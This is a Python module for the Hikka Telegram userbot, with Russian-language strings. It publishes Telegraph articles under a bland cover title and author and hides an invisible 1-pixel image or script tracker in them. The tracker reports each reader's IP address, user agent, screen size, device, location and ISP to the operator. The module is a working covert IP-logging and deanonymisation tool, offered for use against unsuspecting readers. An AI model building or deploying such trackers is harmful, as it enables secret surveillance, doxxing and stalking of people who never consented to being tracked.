# meta developer: @sunshinelzt
# scope: hikka_only
# scope: hikka_min 1.3.0
# requires: telegraph

import logging
import random
import string
import re
import json
import base64
from telethon.tl.types import Message
from .. import loader, utils
import aiohttp
import asyncio
from datetime import datetime
from telegraph import Telegraph
from telegraph.exceptions import TelegraphException
from urllib.parse import quote

logger = logging.getLogger(__name__)

@loader.tds
class TelegraphTrackerMod(loader.Module):
    """Создает реальные Telegraph статьи с невидимым трекером для получения информации о пользователе"""
    
    strings = {
        "name": "TelegraphTracker",
        "loading": "🔄 <b>Создание статьи в Telegraph...</b>",
        "tgph_created": "📝 <b>Telegraph статья успешно создана!</b>\n\n<b>Название:</b> <code>{title}</code>\n<b>URL:</b> <code>{url}</code>\n<b>ID трекера:</b> <code>{track_id}</code>",
        "account_created": "✅ <b>Telegraph аккаунт создан!</b>\n<b>Имя:</b> {name}\n<b>Токен:</b> <code>{token}</code>",
        "error": "❌ <b>Ошибка:</b> {error}",
        "no_data": "❌ <b>Нет данных о посещениях</b>",
        "user_info": "✅ <b>Информация о посетителе:</b>\n\n📱 <b>IP-адрес:</b> <code>{ip}</code>\n🌐 <b>User-Agent:</b> <code>{ua}</code>\n🔍 <b>Устройство:</b> <code>{device}</code>\n📍 <b>Локация:</b> <code>{location}</code>\n🌍 <b>Страна:</b> <code>{country}</code>\n🏙 <b>Город:</b> <code>{city}</code>\n📶 <b>Интернет-провайдер:</b> <code>{isp}</code>\n⏱ <b>Время посещения:</b> <code>{time}</code>",
        "user_visit": "👁 <b>Новое посещение вашей статьи!</b>\n\n📝 <b>Статья:</b> <code>{title}</code>\n📱 <b>IP-адрес:</b> <code>{ip}</code>\n🌐 <b>Устройство:</b> <code>{device}</code>\n🌍 <b>Местоположение:</b> <code>{location}</code>",
        "stats_title": "📊 <b>Статистика Telegraph статей</b>\n\n",
        "help_info": "ℹ️ <b>TelegraphTracker - модуль для создания статей в Telegraph с трекером</b>\n\n<b>Команды:</b>\n• <code>.tgph</code> - создать новую статью с трекером\n• <code>.tgphset</code> - настроить Telegraph аккаунт\n• <code>.tgphstats</code> - просмотр статистики статей\n• <code>.tgphinfo [ID]</code> - информация о посетителях\n• <code>.tgphdel [ID]</code> - удалить статью\n\n<b>Настройки:</b>\n• ARTICLE_TITLE - заголовок статьи\n• ARTICLE_TEXT - содержимое статьи\n• AUTHOR_NAME - имя автора\n• TRACKER_URL - URL сервера трекера",
        "article_deleted": "🗑 <b>Статья с ID</b> <code>{id}</code> <b>удалена</b>",
        "article_not_found": "❓ <b>Статья с ID</b> <code>{id}</code> <b>не найдена</b>",
        "article_preview": "📋 <b>Предпросмотр статьи:</b>\n\n<b>Заголовок:</b> {title}\n<b>Автор:</b> {author}\n<b>Текст:</b> {text_preview}...\n\n<b>Для публикации напишите:</b> <code>.tgph publish</code>",
    }
    
    def __init__(self):
        self.config = loader.ModuleConfig(
            "ARTICLE_TITLE", "Интересная информация о Telegram", "Заголовок статьи Telegraph",
            "ARTICLE_TEXT", "Telegram - это мессенджер, который сочетает в себе скорость, безопасность и удобство. Узнайте больше о функциях и возможностях этой платформы.", 
            "Текст для статьи Telegraph (поддерживает HTML-форматирование)",
            "AUTHOR_NAME", "Telegram Insider", "Имя автора статьи",
            "NOTIFY_ON_VISIT", True, "Уведомлять о посещениях статьи",
            "TRACKER_URL", "https://your-tracking-server.com/track", "URL трекинг-сервера",
            "INVISIBLE_PIXEL", True, "Использовать невидимый пиксель для трекинга",
            "USE_REAL_TELEGRAPH", True, "Использовать реальный Telegraph API"
        )
        
        # Временное хранилище для создаваемой статьи
        self.temp_article = None
        
        # Хранилище данных о статьях и посетителях
        self.articles = {}
        self.visitors = {}
        self.telegraph_token = None
        self.telegraph_author = None
        self.telegraph = None
    
    async def client_ready(self, client, db):
        self.client = client
        self.db = db
        
        # Загружаем сохраненные данные
        self.articles = self.db.get(self.__class__.__name__, "articles", {})
        self.visitors = self.db.get(self.__class__.__name__, "visitors", {})
        self.telegraph_token = self.db.get(self.__class__.__name__, "telegraph_token", None)
        self.telegraph_author = self.db.get(self.__class__.__name__, "telegraph_author", self.config["AUTHOR_NAME"])
        
        # Инициализируем Telegraph API если есть токен
        if self.telegraph_token:
            self.telegraph = Telegraph(self.telegraph_token)
        
    def _save_data(self):
        """Сохраняет данные в базу"""
        self.db.set(self.__class__.__name__, "articles", self.articles)
        self.db.set(self.__class__.__name__, "visitors", self.visitors)
        self.db.set(self.__class__.__name__, "telegraph_token", self.telegraph_token)
        self.db.set(self.__class__.__name__, "telegraph_author", self.telegraph_author)
        
    def _generate_random_id(self, length=12):
        """Генерирует случайный ID для статьи"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _html_to_telegraph_format(self, html_content):
        """Конвертирует HTML в формат, принимаемый Telegraph API"""
        # Это простая реализация, для реального использования нужен более сложный парсер
        content = []
        
        # Разбиваем текст на абзацы
        paragraphs = html_content.split("\n\n")
        for p in paragraphs:
            if p.strip():
                content.append({
                    "tag": "p",
                    "children": [p.strip()]
                })
                
        return content
    
    def _create_tracker_html(self, track_id):
        """Создает HTML-код трекера"""
        if self.config["INVISIBLE_PIXEL"]:
            # Создаем невидимый пиксель с параметрами трекинга
            tracker_url = f"{self.config['TRACKER_URL']}?id={track_id}"
            return f'<img src="{tracker_url}" style="position:absolute;opacity:0;width:1px;height:1px;" />'
        else:
            # Альтернативный вариант через JavaScript (для продвинутого трекинга)
            tracker_js = f"""
            <script>
                (function() {{
                    var img = new Image();
                    img.src = "{self.config['TRACKER_URL']}?id={track_id}&r=" + Math.random() + 
                              "&ua=" + encodeURIComponent(navigator.userAgent) + 
                              "&res=" + screen.width + "x" + screen.height;
                    img.style.position = "absolute";
                    img.style.opacity = "0";
                    img.style.width = "1px";
                    img.style.height = "1px";
                    document.body.appendChild(img);
                }})();
            </script>
            """
            return tracker_js
    
    async def _create_telegraph_account(self, short_name=None, author_name=None):
        """Создает аккаунт в Telegraph"""
        if not short_name:
            short_name = "hikka_" + self._generate_random_id(6)
        
        if not author_name:
            author_name = self.config["AUTHOR_NAME"]
            
        try:
            telegraph = Telegraph()
            account = telegraph.create_account(
                short_name=short_name,
                author_name=author_name
            )
            
            self.telegraph = telegraph
            self.telegraph_token = account["access_token"]
            self.telegraph_author = author_name
            self._save_data()
            
            return account
        except Exception as e:
            logger.exception(f"Ошибка при создании аккаунта Telegraph: {e}")
            return None
    
    async def _create_telegraph_page(self, title, content, author_name, track_id):
        """Создает страницу в Telegraph"""
        if not self.telegraph:
            if not self.telegraph_token:
                account = await self._create_telegraph_account(author_name=author_name)
                if not account:
                    return None, "Не удалось создать аккаунт Telegraph"
            else:
                self.telegraph = Telegraph(self.telegraph_token)
        
        try:
            # Преобразуем текст статьи в формат Telegraph
            telegraph_content = self._html_to_telegraph_format(content)
            
            # Добавляем невидимый трекер в конец статьи
            tracker_html = self._create_tracker_html(track_id)
            telegraph_content.append({
                "tag": "div",
                "children": [tracker_html]
            })
            
            # Создаем страницу
            response = self.telegraph.create_page(
                title=title,
                author_name=author_name,
                html_content=''.join([f"<p>{p['children'][0]}</p>" for p in telegraph_content if p['tag'] == 'p']) + tracker_html
            )
            
            page_url = f"https://telegra.ph/{response['path']}"
            return page_url, None
        except Exception as e:
            logger.exception(f"Ошибка при создании страницы Telegraph: {e}")
            return None, str(e)
    
    @loader.owner
    async def tgphsetcmd(self, message: Message):
        """Настроить аккаунт Telegraph"""
        args = utils.get_args_raw(message)
        
        if not args:
            if not self.telegraph_token:
                await utils.answer(message, "⚠️ <b>Аккаунт Telegraph не настроен.</b>\n\nИспользуйте: <code>.tgphset create</code> для создания нового аккаунта.")
            else:
                await utils.answer(message, f"✅ <b>Аккаунт Telegraph настроен</b>\n\n<b>Имя автора:</b> {self.telegraph_author}\n<b>Токен:</b> <code>{self.telegraph_token[:15]}...</code>")
            return
            
        if args == "create":
            await utils.answer(message, "🔄 <b>Создание нового аккаунта Telegraph...</b>")
            account = await self._create_telegraph_account()
            
            if account:
                await utils.answer(
                    message, 
                    self.strings["account_created"].format(
                        name=account["short_name"],
                        token=account["access_token"]
                    )
                )
            else:
                await utils.answer(message, self.strings["error"].format(error="Не удалось создать аккаунт Telegraph"))
                
        elif args.startswith("token "):
            # Установка собственного токена
            token = args.split("token ")[1].strip()
            
            try:
                telegraph = Telegraph(token)
                account_info = telegraph.get_account_info()
                
                self.telegraph = telegraph
                self.telegraph_token = token
                self.telegraph_author = account_info.get("author_name", self.config["AUTHOR_NAME"])
                self._save_data()
                
                await utils.answer(
                    message, 
                    f"✅ <b>Токен Telegraph успешно установлен</b>\n\n<b>Имя автора:</b> {self.telegraph_author}"
                )
            except Exception as e:
                await utils.answer(message, self.strings["error"].format(error=f"Неверный токен: {str(e)}"))
                
        elif args.startswith("author "):
            # Установка имени автора
            author_name = args.split("author ")[1].strip()
            
            self.telegraph_author = author_name
            self._save_data()
            
            if self.telegraph:
                try:
                    self.telegraph.edit_account_info(author_name=author_name)
                except Exception as e:
                    logger.warning(f"Не удалось обновить имя автора в Telegraph: {e}")
            
            await utils.answer(message, f"✅ <b>Имя автора установлено:</b> {author_name}")
    
    @loader.owner
    async def tgphcmd(self, message: Message):
        """Создать статью в Telegraph с трекером"""
        args = utils.get_args_raw(message)
        
        if args == "publish" and self.temp_article:
            # Публикуем подготовленную статью
            await utils.answer(message, self.strings["loading"])
            
            title = self.temp_article["title"]
            content = self.temp_article["content"]
            author = self.temp_article["author"]
            track_id = self.temp_article["track_id"]
            
            page_url, error = await self._create_telegraph_page(title, content, author, track_id)
            
            if error:
                return await utils.answer(message, self.strings["error"].format(error=error))
                
            # Сохраняем информацию о статье
            self.articles[track_id] = {
                "title": title,
                "url": page_url,
                "author": author,
                "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "visits": 0
            }
            self._save_data()
            
            # Сбрасываем временную статью
            self.temp_article = None
            
            await utils.answer(
                message, 
                self.strings["tgph_created"].format(
                    title=title,
                    url=page_url,
                    track_id=track_id
                )
            )
            return
            
        # Создаем новую статью
        title = self.config["ARTICLE_TITLE"]
        content = self.config["ARTICLE_TEXT"]
        author = self.telegraph_author or self.config["AUTHOR_NAME"]
        track_id = self._generate_random_id()
        
        # Сохраняем во временное хранилище
        self.temp_article = {
            "title": title,
            "content": content,
            "author": author,
            "track_id": track_id
        }
        
        # Показываем предпросмотр статьи
        text_preview = content[:100].replace("\n", " ")
        await utils.answer(
            message,
            self.strings["article_preview"].format(
                title=title,
                author=author,
                text_preview=text_preview
            )
        )
    
    @loader.owner
    async def tgphstatscmd(self, message: Message):
        """Показать статистику по созданным статьям"""
        if not self.articles:
            return await utils.answer(message, self.strings["no_data"])
        
        response = self.strings["stats_title"]
        
        for idx, (track_id, article) in enumerate(sorted(self.articles.items(), key=lambda x: x[1]["created"], reverse=True), 1):
            visits = len(self.visitors.get(track_id, []))
            response += f"{idx}. <b>{article['title']}</b>\n"
            response += f"   👁 <code>{visits}</code> посещений | ID: <code>{track_id}</code>\n"
            response += f"   🔗 <code>{article['url']}</code>\n"
            response += f"   📅 Создана: {article['created']}\n\n"
        
        response += "\nИспользуйте <code>.tgphinfo [ID]</code> для подробной информации о посетителях."
        await utils.answer(message, response)
    
    @loader.owner
    async def tgphinfocmd(self, message: Message):
        """Показать информацию о посетителях статьи"""
        args = utils.get_args_raw(message)
        
        if not args:
            return await utils.answer(
                message, 
                "⚠️ <b>Укажите ID статьи</b>\n\nПример: <code>.tgphinfo abc123</code>"
            )
        
        if args not in self.visitors or not self.visitors[args]:
            return await utils.answer(message, self.strings["no_data"])
        
        article = self.articles.get(args, {"title": "Неизвестная статья"})
        visitors_data = self.visitors[args]
        
        response = f"📊 <b>Информация о посещениях статьи</b>\n\n"
        response += f"📝 <b>Название:</b> {article['title']}\n"
        response += f"👁 <b>Всего посещений:</b> {len(visitors_data)}\n\n"
        
        # Выводим последние 10 посещений
        for i, visitor in enumerate(visitors_data[-10:], 1):
            response += f"<b>Посещение #{i}</b>\n"
            response += f"📱 IP: <code>{visitor.get('ip', 'неизвестно')}</code>\n"
            response += f"🌐 Устройство: <code>{visitor.get('device', 'неизвестно')}</code>\n"
            response += f"📍 Локация: <code>{visitor.get('location', 'неизвестно')}</code>\n"
            response += f"⏱ Время: <code>{visitor.get('time', 'неизвестно')}</code>\n\n"
        
        await utils.answer(message, response)
    
    @loader.owner
    async def tgphdelcmd(self, message: Message):
        """Удалить статью по ID"""
        args = utils.get_args_raw(message)
        
        if not args:
            return await utils.answer(
                message, 
                "⚠️ <b>Укажите ID статьи для удаления</b>\n\nПример: <code>.tgphdel abc123</code>"
            )
        
        if args not in self.articles:
            return await utils.answer(
                message, 
                self.strings["article_not_found"].format(id=args)
            )
        
        # Удаляем статью из Telegraph если возможно
        if self.telegraph:
            try:
                # Извлекаем path из URL
                path = self.articles[args]["url"].split("telegra.ph/")[1]
                self.telegraph.delete_page(path)
            except Exception as e:
                logger.warning(f"Не удалось удалить статью из Telegraph: {e}")
        
        # Удаляем данные из локального хранилища
        del self.articles[args]
        if args in self.visitors:
            del self.visitors[args]
        
        self._save_data()
        
        await utils.answer(
            message, 
            self.strings["article_deleted"].format(id=args)
        )
    
    @loader.owner
    async def tgphhelpcmd(self, message: Message):
        """Показать помощь по модулю"""
        await utils.answer(message, self.strings["help_info"])
    
    async def process_tracker_data(self, track_id, data):
        """
        Обрабатывает данные от трекера
        
        Этот метод должен вызываться вашим трекинг-сервером через API или другим способом
        """
        if track_id not in self.articles:
            return
        
        # Сохраняем информацию о посетителе
        visitor_info = {
            "ip": data.get("ip", "неизвестно"),
            "user_agent": data.get("user_agent", "неизвестно"),
            "device": self._detect_device(data.get("user_agent", "")),
            "location": data.get("location", "неизвестно"),
            "country": data.get("country", "неизвестно"),
            "city": data.get("city", "неизвестно"),
            "isp": data.get("isp", "неизвестно"),
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        if track_id not in self.visitors:
            self.visitors[track_id] = []
        
        self.visitors[track_id].append(visitor_info)
        self._save_data()
        
        # Отправляем уведомление, если включено
        if self.config["NOTIFY_ON_VISIT"]:
            article = self.articles[track_id]
            await self.client.send_message(
                "me",  # Отправляем сообщение себе в избранное
                self.strings["user_visit"].format(
                    title=article["title"],
                    ip=visitor_info["ip"],
                    device=visitor_info["device"],
                    location=visitor_info["location"]
                )
            )
    
    def _detect_device(self, user_agent):
        """Определяет устройство по User-Agent"""
        if not user_agent:
            return "Неизвестно"
        
        if "iPhone" in user_agent:
            match = re.search(r"iPhone\s*OS\s*(\d+)", user_agent)
            ios_version = match.group(1) if match else ""
            return f"iPhone (iOS {ios_version})" if ios_version else "iPhone"
        
        if "iPad" in user_agent:
            return "iPad"
            
        if "Android" in user_agent:
            match = re.search(r"Android\s+(\d+)", user_agent)
            android_version = match.group(1) if match else ""
            
            if "Mobile" in user_agent:
                device_type = "смартфон"
            else:
                device_type = "планшет"
                
            return f"Android {android_version} ({device_type})" if android_version else f"Android ({device_type})"
        
        if "Windows" in user_agent:
            match = re.search(r"Windows NT\s+(\d+\.\d+)", user_agent)
            win_version = match.group(1) if match else ""
            
            versions = {
                "10.0": "Windows 10",
                "6.3": "Windows 8.1",
                "6.2": "Windows 8",
                "6.1": "Windows 7",
                "6.0": "Windows Vista",
                "5.2": "Windows XP x64",
                "5.1": "Windows XP",
            }
            
            return versions.get(win_version, f"Windows ({win_version})") if win_version else "Windows"
        
        if "Macintosh" in user_agent:
            match = re.search(r"Mac OS X\s+(\d+[._]\d+)", user_agent)
            mac_version = match.group(1).replace("_", ".") if match else ""
            return f"macOS {mac_version}" if mac_version else "macOS"
        
        if "Linux" in user_agent and "Android" not in user_agent:
            return "Linux"
            
        if "BlackBerry" in user_agent or "BB10" in user_agent:
            return "BlackBerry"
            
        if "Kindle" in user_agent:
            return "Kindle"
            
        if "PlayStation" in user_agent:
            return "PlayStation"
            
        if "Xbox" in user_agent:
            return "Xbox"
            
        if "Nintendo" in user_agent:
            return "Nintendo Switch"
        
        # Определение браузера
        browsers = [
            ("Chrome", r"Chrome/(\d+)"),
            ("Firefox", r"Firefox/(\d+)"),
            ("Safari", r"Safari/(\d+)"),
            ("Edge", r"Edge/(\d+)"),
            ("Opera", r"Opera/(\d+)"),
            ("Yandex", r"YaBrowser/(\d+)"),
            ("MSIE", r"MSIE\s+(\d+)"),
            ("UCBrowser", r"UCBrowser/(\d+)")
        ]
        
        for browser_name, pattern in browsers:
            match = re.search(pattern, user_agent)
            if match:
                version = match.group(1)
                return f"Браузер {browser_name} {version}"
        
        return "Неизвестное устройство"
